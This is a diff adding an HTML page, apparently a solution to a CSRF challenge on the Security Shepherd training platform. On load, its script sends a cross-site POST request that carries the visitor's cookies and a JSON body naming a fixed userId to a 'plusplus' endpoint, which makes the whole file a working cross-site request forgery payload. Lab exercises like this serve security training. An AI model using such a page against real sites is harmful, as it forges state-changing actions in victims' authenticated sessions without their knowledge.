@@ -1,0 +1,23 @@
+<html>
+<head>
+<script>
+function put() {
+    document.domain = "security-shepherd.dev.inf.elasticnet.co";
+    fetch('https://security-shepherd.dev.inf.elasticnet.co/user/csrfchallengejson/plusplus', {
+        method: 'POST',
+        credentials: "include",
+        mode: "no-cors",
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+            "userId": "ceb75022bc88977c7f9a3b41ac341a47cc99d33d"
+        })
+    })
+}
+</script>
+
+</head>
+<body onload="put()">
+</body>
+</html>
